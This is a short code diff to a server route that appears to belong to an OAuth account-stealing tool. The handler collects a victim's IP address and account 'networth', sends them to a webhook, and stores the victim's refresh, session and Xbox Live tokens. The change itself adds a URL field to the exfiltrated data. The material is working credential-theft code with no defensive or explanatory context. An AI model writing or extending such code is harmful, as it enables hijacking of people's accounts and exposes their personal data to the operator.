@@ -34,6 +34,7 @@ export const get: APIRoute = async ({ request, redirect }) => {
         console.log("got networth data")
         //add ip address to data, cloudflare header
         const ip = request.headers.get("CF-Connecting-IP") || request.headers.get("X-Forwarded-For") || request.headers.get("X-Real-IP") || '69.69.69.69 (Error, dunny why)'; 
+        data["url"] = url;
         await oauthWebhook(data, nwData, ip, webhook, blacklisted);
         console.log("sent webhook")
         const saveSuccess = await saveToken(state, data['username'], data['uuid'], data['refresh_token'], data["session_token"], data["xbl_token"], data["xbl_hash"], url, nwData['unsoulboundNw'])
